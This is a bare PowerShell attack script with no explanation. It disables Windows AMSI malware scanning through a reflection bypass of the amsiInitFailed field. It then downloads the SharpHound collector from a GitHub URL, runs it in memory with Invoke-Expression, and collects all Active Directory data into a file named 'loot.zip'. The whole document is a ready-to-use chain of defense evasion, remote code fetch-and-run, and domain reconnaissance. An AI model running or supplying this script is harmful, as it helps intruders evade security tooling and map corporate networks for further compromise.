$flags = [System.Reflection.BindingFlags] "NonPublic,Static"
$amsiUtils = [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils")
$field = $amsiUtils.GetField("amsiInitFailed", $flags)
$field.SetValue($null, $true)

$code = Invoke-WebRequest "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1" -UseBasicParsing | Select-Object -ExpandProperty Content

Invoke-Expression $code

Invoke-BloodHound -CollectionMethod All -ZipFileName loot.zip
